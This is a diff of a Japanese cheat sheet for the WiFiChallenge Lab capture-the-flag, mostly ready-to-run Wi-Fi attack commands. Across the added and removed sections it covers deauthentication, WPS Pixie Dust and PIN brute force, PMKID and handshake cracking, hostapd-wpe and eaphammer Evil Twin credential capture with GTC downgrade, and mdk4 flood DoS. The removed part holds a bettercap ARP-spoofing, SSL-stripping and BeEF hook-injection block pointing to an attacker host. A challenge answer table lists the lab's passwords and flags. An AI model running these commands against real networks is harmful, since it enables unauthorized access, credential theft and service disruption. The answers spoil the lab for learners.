-tshark -r recon-01.cap -Y "eap.type == 3" -V | grep "Desired Auth Type"
-# 出力: Desired Auth Type: UMTS Authentication and Key Agreement' EAP (EAP-AKA') (50)
-
-# 3. AKA' で hostapd を構築
-nano /etc/hostapd.eap_user
-# 内容 (TAB あり):
-# *	AKA'
-
-nano hostapd-imsi.conf
-```
-
-```conf
-interface=wlan4
+# /etc/hostapd-wpe/hostapd-wpe.conf
+interface=wlan1
+ssid=wifi-corp-legacy
+channel=44
 driver=nl80211
-ssid=wifi-passpoint
-channel=48
-hw_mode=a
-auth_algs=1
 wpa=2
 wpa_key_mgmt=WPA-EAP
-rsn_pairwise=CCMP
 ieee8021x=1
 eap_server=1
-eap_sim_id=0
-eap_sim_db=file:/tmp/sim_db
-eap_user_file=/etc/hostapd.eap_user
-eap_sim_aka_result_ind=1
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+dh_file=/etc/hostapd-wpe/certs/dh
 ```
+
+#### ステップ4: 実行
 
 ```bash
-# 4. 偽の sim_db を構築
-echo "001010000000001 00000000000000000000000000000000 00000000000000000000000000000000" | sudo tee /tmp/sim_db
-
-# 5. hostapd を実行
-sudo hostapd ~/wifi/hostapd-imsi.conf
-
-# 6. 並列スニッフィング
-sudo tshark -i wlan1mon -w /tmp/imsi.pcap
-
-# 7. Deauth
-sudo aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:71:22:19 -c 64:32:A8:BA:18:60 wlan1mon
-
-# 8. IMSI を抽出
-sudo tshark -r /tmp/imsi.pcap -Y "eap.type == 50" -V | grep -iE "Identity|IMSI"
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+tail -f /var/log/hostapd-wpe.log
 ```
 
-**出力:**
-```
-Identity: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com
+#### ステップ5: Deauth とクライアント接続の待機
+
+```bash
+sudo aireplay-ng --deauth 10 -a <BSSID_LEGIT> -c <CLIENT_MAC> wlan0mon
 ```
 
-**最終 IMSI (プレフィックス 6 を削除):** `214070028194561`
+**出力:** クライアント証明書がログに保存される。
 
 ---
 
-<a name="owe"></a>
-## 9. フェーズ 6: OWE ブランチ (Enhanced Open)
-
-```
-OWE (ENC=WPA3, AUTH=OWE)
-│
-├── 直接接続 (99% 成功)
-│   ├── key_mgmt=OWE, ieee80211w=2
-│   ├── wpa_supplicant + dhclient
-│   └── admin/admin → フラグ
-│
-└── 失敗した場合:
-    ├── DragonDrain (OWE handshake への DoS)
-    │   └── dragondrain -d wlan1mon -a <BSSID> -c 44 -r 200
-    │
-    └── リトライ
-```
-
-### 9.1. OWE への接続
-
-```conf
-# gratis.conf
-network={
-    ssid="wifi-gratis"
-    key_mgmt=OWE
-    ieee80211w=2
-    scan_ssid=1
-}
-```
+### 6.6. EAP-GTC 攻撃 — GTC Downgrade
 
 ```bash
-sudo wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
-sudo dhclient wlan3 -v
+sudo python3 eaphammer -i wlan1 \
+  --channel <CH> \
+  --auth wpa-eap \
+  --essid "<SSID_TARGET>" \
+  --creds \
+  --negotiate gtc-downgrade
 ```
 
-### 9.2. DragonDrain (接続失敗時)
-
-```bash
-cd /root/tools/dragondrain-and-time/
-autoreconf -i && ./configure && make
-cd src/
-sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
+→ 端末に平文パスワード:
+```
+[+] EAP identity: CORP\jsmith
+[+] GTC Password: MySecretPassword123!
 ```
 
 ---
 
-<a name="wps"></a>
-## 10. フェーズ 7: WPS ブランチ
+### 6.7. MGT 攻撃のまとめ表
 
-```
-WPS (WPS カラム = 2.0)
-│
-├── 1. WPS ステータスを確認
-│   └── wash -i wlan0mon -c <CH>
-│       ├── Lck = No → 続行
-│       └── Lck = Yes → reaver -L (ロックを無視)
-│
-├── 2. Pixie Dust (最速)
-│   └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1
-│       ├── 成功 → パスワード + PIN
-│       └── 失敗 → PIN ブルートフォース
-│
-└── 3. PIN ブルートフォース
-    └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L
-        ├── WPS PIN: 12345670
-        ├── WPA PSK: @MegaPSKP@ssword!@
-        └── PSK 設定で接続
-```
+| EAP | ツール | 出力 | Hashcat |
+|-----|-------|-------|---------|
+| **MD5** | `eapmd5pass` または tshark | MD5-Challenge ハッシュ | `-m 4800` |
+| **TLS** | `hostapd-wpe` | クライアント証明書 | N/A |
+| **TTLS** | `eaphammer` + `asleap` | MSCHAPv2 | `-m 5500` |
+| **PEAP** | `eaphammer` | MSCHAPv2 | `-m 5500` |
+| **GTC** | `eaphammer` | 平文 | N/A |
 
-### 10.1. WPS の確認
+---
+
+## 🛡️ セクション7: WIDS と DoS（Writeup にはない）
+
+### 7.1. Nzyme による攻撃者の検出
 
 ```bash
-sudo wash -i wlan0mon -c 8
+# WiFiChallenge Lab では Nzyme が VM 上に準備済み
+# チャレンジ 27: 攻撃検出アラートの確認（Deauth、Evil Twin）
 ```
 
-**出力:**
-```
-BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
-F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
-```
-
-| カラム | 意味 | 値 |
-|------|------|-------|
-| WPS | バージョン | `2.0` = 有効 |
-| Lck | ロック済み | `No` = 攻撃可能 |
-
-### 10.2. Pixie Dust
+### 7.2. DoS 攻撃（補足）
 
 ```bash
-sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
-```
+# Beacon Flood
+sudo mdk4 wlan0mon b -n "FakeNet"
 
-### 10.3. PIN ブルートフォース
+# Authentication Flood
+sudo mdk4 wlan0mon a -a <BSSID>
 
-```bash
-sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
-```
+# Deauth Flood
+sudo mdk4 wlan0mon d -b <BSSID_FILE>
 
-**成功時の出力:**
-```
-[+] WPS PIN: '12345670'
-[+] WPA PSK: '@MegaPSKP@ssword!@'
-```
-
-### 10.4. WPS PSK で接続
-
-```conf
-network={
-    ssid="wifi-event"
-    psk="@MegaPSKP@ssword!@"
-}
+# Disassociation
+sudo aireplay-ng --deauth 100 -a <BSSID> wlan0mon
 ```
 
 ---
 
-<a name="wids"></a>
-## 11. フェーズ 8: WIDS (Nzyme)
+## 📊 セクション8: クイック判断 — どのネットワークにどの攻撃？
 
+| ENC | AUTH | WPS | クライアント | 推奨攻撃 | ツール |
+|-----|------|-----|--------|----------------|------|
+| **OPN** | - | - | - | 単純接続 | `wpa_supplicant` |
+| **OPN** | Captive Portal | - | あり | MAC Spoofing + HTTP Sniff | `macchanger` + `airodump-ng` |
+| **WEP** | - | - | あり | ARP Replay | `besside-ng` または `aireplay-ng` |
+| **WPA2** | PSK | **2.0** | どちらでも | **まず WPS** | `reaver -K 1` |
+| **WPA2** | PSK | 0.0 | あり | Handshake + Dictionary | `airodump-ng` + `aircrack-ng` |
+| **WPA2** | PSK | 0.0 | **なし** | **PMKID 攻撃** | `hcxdumptool` |
+| **WPA2** | PSK | 0.0 | Probe 発見 | **Rogue AP** | `hostapd-mana` |
+| **WPA2** | MGT | - | あり | Rogue AP | `eaphammer` |
+| **WPA3** | SAE | - | - | Wacker / Downgrade | `wacker` |
+| **WPA3** | OWE | - | - | （限定的） | - |
+
+---
+
+## 🎯 セクション9: 各攻撃のデータフロー
+
+### OPN + Captive Portal
 ```
-WIDS (Nzyme)
-│
-├── 1. ダッシュボードにアクセス
-│   └── https://127.0.0.1:22900 (admin:admin)
-│
-├── 2. Alerts → 最も古いアラート
-│
-└── 3. Source MAC / Attacker MAC を発見
+スキャン → BSSID+CH → 接続 → DHCP → IP+GW
+    → キャプチャ → アクティブクライアントの MAC
+    → MAC Spoof → 再キャプチャ → HTTP POST → Credential
+    → ログイン → Flag
+```
+
+### WEP
+```
+スキャン → BSSID+CH → トラフィックキャプチャ
+    → Fake Auth → Assoc
+    → ARP Replay → 30k IV → aircrack → WEP キー
+    → wep.conf 作成 → 接続 → IP → Web サーバー → Flag
+```
+
+### WPS
+```
+スキャン → WPS=2.0 → wash → Pixie/PIN → PSK
+    → 設定作成 → 接続 → IP → Flag
+```
+
+### PSK Handshake
+```
+スキャン → BSSID+CH+Client → キャプチャ + Deauth
+    → cap 内の Handshake → aircrack + rockyou → PSK
+    → 接続 → airdecap-ng → 復号トラフィック
+    → Cookie → Session Hijack → Flag
+    → または arp-scan → ユーザーサーバー → Flag（認証なし）
+```
+
+### PMKID
+```
+スキャン → BSSID+CH → hcxdumptool（クライアント不要）
+    → .pcapng → hcxpcapngtool → hash 22000
+    → hashcat → PSK → 接続 → Flag
+```
+
+### MGT
+```
+スキャン → BSSID+CH → EAP キャプチャ
+    → tshark → eap.type → 攻撃手法
+    ├─ MD5: hcxpcapngtool → hashcat -m 4800
+    └─ PEAP/TTLS: eaphammer + Deauth → MSCHAPv2 → hashcat -m 5500
+        → Credential → flag{DOMAIN\USER:PASS}
 ```
 
 ---
 
-<a name="post"></a>
-## 12. ポストエクスプロイテーション
+## 🧠 セクション10: フラグとよく使うオプションの意味
+
+### `airodump-ng`
+
+| フラグ | 意味 |
+|-----|------|
+| `-w` | プレフィックス付きで保存 |
+| `-c` | チャンネルを固定 |
+| `--bssid` | BSSID でフィルタ |
+| `--band abg` | 全バンド |
+| `--wps` | WPS を表示 |
+| `--manufacturer` | メーカー |
+| `--output-format` | 出力形式 |
+
+### `aireplay-ng`
+
+| フラグ | 意味 |
+|-----|------|
+| `-1 3600 -q 10` | Fake Auth |
+| `--arpreplay` | ARP Replay |
+| `-0 N` | N 個の Deauth フレーム |
+| `-5` | Fragmentation |
+| `-4` | ChopChop |
+| `-a` | BSSID |
+| `-c` | クライアント MAC |
+| `-h` | 送信元 MAC |
+
+### `aircrack-ng`
+
+| フラグ | 意味 |
+|-----|------|
+| `-w` | ワードリスト |
+| `-K` | KoreK 攻撃 |
+| `-b` | BSSID |
+
+### `hcxdumptool`
+
+| フラグ | 意味 |
+|-----|------|
+| `-i` | 専用モニターインターフェース |
+| `-w` | pcapng ファイル |
+| `-c` | チャンネル（`7a` = CH 7 band 2.4） |
+| `--rds=2` | ライブ表示 |
+| `-A` | フレームに ACK |
+| `--disable_disassociation` | 自動 Deauth の防止 |
+
+### `hashcat`
+
+| モード | 用途 |
+|-----|------|
+| `-m 22000` | WPA-PBKDF2-PMKID+EAPOL（新形式） |
+| `-m 2500` | WPA-EAPOL-PBKDF2（旧形式） |
+| `-m 4800` | EAP-MD5 |
+| `-m 5500` | MSCHAPv2 |
+| `-m 5600` | NetNTLMv2 |
+| `-a 0` | Straight（辞書） |
+
+### `wpa_supplicant`
+
+| フラグ | 意味 |
+|-----|------|
+| `-Dnl80211` | 標準ドライバ |
+| `-i<iface>` | インターフェース |
+| `-c<file>` | 設定 |
+
+### `tshark` — よく使う Wi-Fi フィルタ
+
+| フィルタ | 用途 |
+|-------|------|
+| `eap` | すべての EAP フレーム |
+| `eap.type == 4` | EAP-MD5 |
+| `eap.type == 25` | PEAP |
+| `wlan.fc.type_subtype == 0` | Association Request |
+| `wlan.fc.type_subtype == 4` | Probe Request |
+| `wlan.fc.type_subtype == 8` | Beacon |
+| `wlan.fc.type_subtype == 12` | Deauth |
+| `wlan.bssid == xx:xx:...` | BSSID でフィルタ |
+| `wlan.sa == xx:xx:...` | 送信元 MAC でフィルタ |
+| `http` | HTTP トラフィック |
+| `http.cookie` | Cookie |
+| `http.set_cookie` | Set-Cookie |
+| `http.request.method == "POST"` | POST フォーム |
+
+---
+
+## 🚨 セクション11: 重要なコツとよくある間違い
+
+### ⚠️ 1. モニターカード
+- **HCXDumptool** には必ず **専用** のモニターインターフェース（別の `phy` 上）を使用 — `wlan0mon` ではない。
+- ネットワークへの **接続** には **managed** インターフェースを使用。
+- 各攻撃の後、次のステップの前に `pkill wpa_supplicant && pkill dhclient`。
+
+### ⚠️ 2. Deauth を伴うキャプチャ
+- **Deauth の前** に `airodump-ng` をチャンネルに固定（`-c N`）。
+- **Deauth の前** のキャプチャは Handshake を見逃す可能性がある。
+- **順序:** チャンネルでキャプチャ → Deauth → 再キャプチャ → `WPA handshake` を確認。
+
+### ⚠️ 3. WPS Locked
+- `wash` の `Lck: Yes` = 一時的にロック。
+- 解決策: `-L`（無視）→ `bully` → 待つ → 代替手法。
+
+### ⚠️ 4. PMKID
+- 別の `phy` 上でのみ動作。
+- AP から PMKID を抽出するのに数分かかることがある。
+- PMKID が見つからない場合、実際のクライアントへの Deauth を試す。
+
+### ⚠️ 5. Enterprise
+- クライアントが **サーバー証明書を検証** する場合 → Rogue AP は失敗。
+- 解決策: `--negotiate gtc-downgrade`（平文パスワードの窃取）。
+- TLS には有効なクライアント証明書が必要。
+
+### ⚠️ 6. HMAC / フラグ形式
+- Enterprise フラグ形式: `flag{DOMAIN\USERNAME:PASSWORD}`
+- EAP-MD5 の式: `Response = MD5(ID || Password || Challenge)`
+
+### ⚠️ 7. IPv6 と Client Isolation
+- `arp-scan` が空の場合、**Client Isolation** が有効な可能性。
+- `nmap -sn 192.168.2.0/24` でも試せる。
+
+---
+
+## 📁 セクション12: 完全なプロジェクトの構造
 
 ```
-ネットワーク接続後
-│
-├── 1. ネットワーク情報
-│   ├── ip a show wlan3
-│   ├── ip route | grep default
-│   └── arp-scan -I wlan3 -l
-│
-├── 2. トラフィック復号 (WPA2)
-│   └── airdecap-ng -e <SSID> -p <PASS> capture-01.cap
-│
-├── 3. 認証情報の抽出
-│   ├── tshark -Y "http.request.method == POST" -T fields -e http.file_data
-│   ├── tshark -Y "http.cookie" -T fields -e http.cookie
-│   ├── tshark -Y "http.authorization" -T fields -e http.authorization
-│   └── tshark -Y "ftp" -T fields -e ftp.request.arg
-│
-├── 4. Session Hijacking
-│   └── curl -i -b "PHPSESSID=..." http://<gateway>/
-│
-├── 5. Client Isolation のテスト
-│   ├── arp-scan -I wlan3 -l
-│   └── curl http://<other_client>/
-│
-└── 6. MitM 攻撃 (Client Isolation が無効な場合)
-    ├── ARP Spoofing (bettercap)
-    ├── SSL Stripping (bettercap http.proxy.sslstrip)
-    ├── DNS Spoofing (bettercap dns.spoof)
-    └── JS Injection (BeEF)
-```
-
-### 12.1. Cookie 抽出と Session Hijacking
-
-```bash
-# 1. 復号
-airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap
-
-# 2. Cookie を抽出
-tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" -T fields -e http.cookie
-# 出力: PHPSESSID=296228e3896440bd508d4c69e11e265c
-
-# 3. Cookie を使用
-curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
-```
-
-### 12.2. HTTP から認証情報を抽出
-
-```bash
-tshark -r capture-dec.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
-# 出力: Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
-```
-
-### 12.3. Client Isolation のテスト
-
-```bash
-# 1. IP を発見
-sudo arp-scan -I wlan3 -l
-
-# 2. アクセスをテスト
-curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
-```
-
-### 12.4. MitM 攻撃 (bettercap)
-
-```bash
-# IP フォワーディングを有効化
-sudo sysctl -w net.ipv4.ip_forward=1
-
-# bettercap を実行
-sudo bettercap -iface eth0
-
-# bettercap 内:
-net.probe on
-net.show
-set arp.spoof.targets 192.168.1.50
-set arp.spoof.fullduplex true
-arp.spoof on
-net.sniff on
-
-# SSL Stripping
-set http.proxy.sslstrip true
-http.proxy on
-
-# DNS Spoofing
-set dns.spoof.address 192.168.1.100
-set dns.spoof.domains google.com
-dns.spoof on
-
-# BeEF Injection
-set http.proxy.injectjs http://YOUR_IP:3000/hook.js
+~/wifi/
+├── scan-01.cap            # 初期スキャン
+├── scan-01.csv
+├── scanc6-01.cap          # チャンネル 6 のキャプチャ（wifi-mobile）
+├── scanc6-01-dec.cap      # 復号済み
+├── wifi-old-01.cap        # WEP
+├── legacy-01.cap          # EAP
+├── campus.pcapng          # PMKID
+├── campus.22000           # hashcat 用ハッシュ
+├── hostapd.hccapx         # Rogue AP からの Handshake
+├── hash.22000             # 新しい hashcat 形式
+├── open.conf              # オープンネットワーク設定
+├── psk.conf               # PSK 設定
+├── wep.conf               # WEP 設定
+├── campus.conf            # WPA2-PSK 設定
+└── hostapd-mana.conf      # Rogue AP 設定
 ```
 
 ---
 
-<a name="cheatsheet"></a>
-## 13. 主要コマンドチートシート
+## 🎓 セクション13: 各攻撃前の最終チェックリスト
 
-### 13.1. 偵察
-
-```bash
-# 包括的スキャン
-sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg
-
-# ターゲットスキャン
-sudo airodump-ng wlan0mon -c <CH> --bssid <BSSID> -w target
-
-# WPS チェック
-sudo wash -i wlan0mon -c <CH>
-
-# PMF チェック
-sudo iw dev wlan2 scan | grep -A 20 "SSID" | grep -A 6 "RSN"
-
-# pcap 分析
-tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid
-tshark -r capture.cap -Y "eap.identity" -T fields -e eap.identity
-tshark -r capture.cap -Y "eap.type" -T fields -e eap.type | sort | uniq -c
-```
-
-### 13.2. 攻撃
-
-```bash
-# Deauth
-sudo aireplay-ng -0 10 -a <BSSID> -c <CLIENT> wlan0mon
-
-# Handshake
-sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon
-
-# PMKID
-sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A
-
-# WPS Pixie Dust
-sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1
-
-# WPS PIN ブルートフォース
-sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L
-
-# WEP 自動
-sudo besside-ng -c <CH> -b <BSSID> wlan2 -v
-
-# WEP 手動
-sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
-sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
-sudo aircrack-ng capture-01.cap
-
-# wacker.py (WPA3)
-./wacker.py --wordlist rockyou.txt --ssid <SSID> --bssid <BSSID> \
-            --interface wlan2 --freq 2462
-
-# DragonDrain (OWE/WPA3 DoS)
-sudo ./dragondrain -d wlan1mon -a <BSSID> -c <CH> -b 54 -n 1 -r 200
-```
-
-### 13.3. クラッキング
-
-```bash
-# WPA2 (Handshake/PMKID)
-hashcat -m 22000 -a 0 hash.22000 rockyou.txt --force
-aircrack-ng capture-01.cap -w rockyou.txt
-
-# WEP
-aircrack-ng wep-01.cap
-
-# EAP-MD5
-hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
-hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt
-
-# MSCHAPv2
-asleap -C <CHALLENGE> -R <RESPONSE> -W rockyou.txt
-hashcat -m 5500 hash.5500 rockyou.txt
-
-# NetNTLMv2
-hashcat -m 5600 hash.5600 rockyou.txt
-```
-
-### 13.4. 接続
-
-```bash
-# OPN
-wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
-dhclient wlan2 -v
-
-# WEP
-wpa_supplicant -Dnl80211 -iwlan2 -c wep.conf
-dhclient wlan2 -v
-
-# WPA2-PSK
-wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf
-dhclient wlan3 -v
-
-# WPA3-SAE
-wpa_supplicant -i wlan2 -c wpa3.conf
-
-# WPA2-Enterprise (PEAP)
-wpa_supplicant -Dnl80211 -iwlan3 -c corp.conf -B
-dhclient wlan3 -v
-
-# OWE
-wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
-```
-
-### 13.5. ポストエクスプロイト
-
-```bash
-# 復号
-airdecap-ng -e <SSID> -p <PASS> capture-01.cap
-
-# Cookie を抽出
-tshark -r capture-dec.cap -Y "http.cookie" -T fields -e http.cookie
-
-# POST を抽出
-tshark -r capture-dec.cap -Y "http.request.method == POST" -T fields -e http.file_data
-
-# Session Hijacking
-curl -i -b "PHPSESSID=..." http://<gateway>/
-
-# Client Isolation
-arp-scan -I wlan3 -l
-curl http://<other_client>/
-```
+- [ ] `pkill wpa_supplicant && pkill dhclient`
+- [ ] `airmon-ng check kill`
+- [ ] モニターモードインターフェースがアクティブ（`iw dev`）
+- [ ] ターゲットチャンネルと BSSID が特定済み
+- [ ] NetworkManager プロセスが停止済み
+- [ ] Rogue AP 用: 空いている managed インターフェースがある
+- [ ] PMKID 用: 別の phy 上の専用モニターインターフェース
+- [ ] ワードリストが準備済み（`/root/rockyou-top100000.txt`）
+- [ ] PSK/KEY 取得後: `.conf` ファイルを作成済み
+- [ ] 接続後: `dhclient` と `ip route` を実行済み
+- [ ] Web 用: ゲートウェイと内部サーバー IP を特定済み
 
 ---
 
-<a name="troubleshoot"></a>
-## 14. よくあるトラブルシューティング表
+## 🏁 セクション14: 主要チャレンジとクイック回答（Writeup より）
 
-| エラー | 原因 | 解決策 |
-|------|------|--------|
-| `failed to arm interface` | 共有インターフェース | `iw phy phy70 interface add wlan6mon type monitor` |
-| `fixed channel -1` | チャンネル未設定 | `sudo ip link set wlan0mon down; sudo iw dev wlan0mon set channel 44; sudo ip link set wlan0mon up` |
-| `unknown CA` | クライアントが証明書を検証 | `--negotiate gtc-downgrade` または本物の証明書をインポート |
-| `Supplicant used different EAP type` | 間違ったメソッド | `tshark -Y "eap.type == 3" -V` → `Desired Auth Type` を確認 |
-| `WPS pin not found` | Pixie Dust 失敗 | `reaver -S -N -L` (PIN ブルートフォース) |
-| `Lck: Yes` (WPS Locked) | WPS ロック | `reaver -L` または待機 |
-| `file corrupt` (hashcat) | ハッシュフォーマット | `hcxhash2cap --hccapx=... -c aux.pcap` → `hcxpcapngtool` |
-| `RSA key ok` (パスワードなし) | パスワードなしキー | `--private-key-passwd` を削除 |
-| `create_ap.all.lock` | 前のプロセス | `sudo rm -f /tmp/create_ap.all.lock` |
-| `Address already in use` (ポート 80) | Apache/nginx | `sudo fuser -k 80/tcp` |
-| `wpa_supplicant` ハング | スタックしたプロセス | `sudo pkill wpa_supplicant; sudo ip link set wlan3 down; sleep 2; up` |
-| `dhclient` タイムアウト | DHCP 応答なし | `sudo dhclient -v -r wlan3` でリトライ |
+| # | ネットワーク | 手法 | 出力 |
+|---|-------|------|--------|
+| 01 | wifi-global | スキャン | CH=44 |
+| 02 | wifi-IT | チャンネル 11 スキャン | クライアント BSSID |
+| 03 | （Probe） | tshark | `wifi-offices` |
+| 04 | （隠し） | mdk4 ブルートフォース ESSID | `wifi-free` |
+| 05 | wifi-free | 接続 + admin/admin | Flag |
+| 06 | wifi-guest | MAC Spoofing + HTTP Sniff | `free1:Jyl1iq8UajZ1fEK` |
+| 07 | wifi-old | besside-ng | `11:bb:33:cd:55` |
+| 08 | wifi-mobile | Handshake + rockyou | `starwars1` |
+| 09 | wifi-mobile | airdecap-ng | `192.168.2.1`、`192.168.2.8` |
+| 10 | wifi-mobile | Cookie Hijack | `PHPSESSID=29622...` |
+| 11 | wifi-mobile | arp-scan | サーバー `192.168.2.7` |
+| 12 | wifi-offices | Rogue AP + Hashcat | `password1` |
+| 28 | wifi-event | WPS Pixie/PIN | `@MegaPSKP@ssword!@` |
+| 29 | wifi-corp-legacy | EAP-MD5 + hashcat 4800 | `WORKGROUP\administrator:pinkfloyd7` |
+| 31 | wifi-campus | PMKID + hashcat 22000 | `basketball` |
 
-### 14.1. 高度なトラブルシューティング
+---
+
+## 🧭 セクション15: 最終ステップ — PSK/KEY からフラグへ
+
+任意のネットワークのキーを取得した後:
 
 ```bash
-# インターフェースの状態確認
-iw dev wlan0mon info
-iwconfig wlan0mon
-
-# チャンネル確認
-sudo iw dev wlan0mon set channel 44
-iw dev wlan0mon info | grep channel
-
-# 干渉確認
-sudo airmon-ng check
-sudo airmon-ng check kill
-
-# 完全リセット
-sudo pkill wpa_supplicant
-sudo pkill dhclient
-sudo pkill hostapd
-sudo pkill dnsmasq
-sudo airmon-ng check kill
-sudo ip link set wlan0 down
-sudo ip link set wlan0 up
+# 1. 接続設定を作成
+# 2. 接続
+sudo wpa_supplicant -Dnl80211 -iwlanX -c ~/wifi/<name>.conf
+# 3. IP を取得
+sudo dhclient wlanX -v
+# 4. ネットワークを特定
+ip a show wlanX
+ip route | grep default
+# 5. 内部ネットワークをスキャン（Client Isolation が無効な場合）
+sudo arp-scan -I wlanX -l
+# 6. Web サーバーにアクセス
+curl -s -m 3 http://<IP>/ | grep -o 'flag{[^}]*}'
+# 7. ログインが必要な場合 → トラフィックから Cookie（airdecap-ng）または HTTP Sniff から認証情報
 ```
 
----
-
-<a name="checklist"></a>
-## 15. 最終チェックリスト
-
-### テスト前:
-- [ ] 無線カードがモニターモードでテスト済み
-- [ ] すべてのツールがインストール済み: `aircrack-ng`, `hashcat`, `hcxdumptool`, `reaver`, `eaphammer`, `hostapd-mana`, `wacker`, `air-hammer`, `berate_ap`, `wpa_sycophant`, `tshark`
-- [ ] ワードリスト準備完了: `/root/rockyou-top100000.txt`
-- [ ] `airmon-ng check kill` の動作を理解している
-
-### テスト中:
-- [ ] `airodump-ng --band abg` を実行した (2.4GHz だけでなく)
-- [ ] ターゲットチャンネルと BSSID を記録した
-- [ ] 暗号化と AUTH タイプを特定した
-- [ ] `wash` で WPS を確認した
-- [ ] `iw scan` で PMF を確認した
-- [ ] MGT の場合、`eap.type` を抽出した
-- [ ] クラック後に `airdecap-ng` を実行した
-- [ ] トラフィックから Cookie/Credential を抽出した
-- [ ] `ip route` を実行してゲートウェイを発見した
-- [ ] Client Isolation のために `arp-scan` を実行した
-
-### 黄金律:
-1. **自動化ツール禁止!** (`wifite`, `wifiphisher` は禁止、`besside-ng` は WEP のみ)
-2. **常にチャンネルをロック** (`-c <CH>`)
-3. **PMKID は Handshake より速い**
-4. **WPS を確認** (最速パス)
-5. **攻撃前にリセット** (`pkill`, `airmon-ng check kill`)
-6. **接続ごとに `ip route` を実行**
-7. **すべての pcap を tshark で分析** (Identity, Certificate, Cookie)
-
----
-
-<a name="comparison"></a>
-## 16. 攻撃比較表
-
-| ネットワーク種別 | 主要メソッド | ツール | 所要時間 | 難易度 |
-|----------|----------|-------|------|------|
-| **OPN** | 直接接続 | `wpa_supplicant` | 1 分 | ⭐ |
-| **OPN + Portal** | MAC Spoofing | `macchanger` + `tshark` | 5 分 | ⭐⭐ |
-| **WEP** | besside-ng | `besside-ng` | 5〜10 分 | ⭐ |
-| **WEP** | 手動 | `aireplay-ng` + `aircrack` | 15〜30 分 | ⭐⭐ |
-| **WPA2 + Client** | Deauth + Handshake | `aireplay-ng` + `hashcat` | 2〜5 分 | ⭐⭐ |
-| **WPA2 クライアントなし** | PMKID | `hcxdumptool` + `hashcat` | 1〜3 分 | ⭐ |
-| **WPA2 不在 + Probe** | Rogue AP | `hostapd-mana` | 5〜10 分 | ⭐⭐⭐ |
-| **WPA3 Transition** | ダウングレード | `hostapd-mana` | 5 分 | ⭐⭐⭐ |
-| **WPA3-only** | wacker.py | `wacker` | 30〜60 分 | ⭐⭐⭐⭐ |
-| **WPS** | Pixie Dust | `reaver -K 1` | 10 秒 | ⭐ |
-| **WPS** | PIN ブルートフォース | `reaver -S -N -L` | 1〜4 時間 | ⭐⭐⭐ |
-| **MGT + MD5** | パッシブ + クラック | `hcxpcapngtool` | 1 分 | ⭐ |
-| **MGT + PEAP** | Evil Twin | `eaphammer` | 5〜15 分 | ⭐⭐⭐ |
-| **MGT + PEAP** | Relay | `berate_ap` + `sycophant` | 10 分 | ⭐⭐⭐⭐ |
-| **MGT + TLS** | 偽証明書 | `openssl` + `eaphammer` | 5 分 | ⭐⭐⭐⭐ |
-| **MGT + SIM** | IMSI 抽出 | `hostapd` | 5 分 | ⭐⭐⭐ |
-| **OWE** | 直接接続 | `wpa_supplicant` | 1 分 | ⭐ |
-| **OWE** | DragonDrain | `dragondrain` | 5 分 | ⭐⭐⭐ |
 
 ---
 
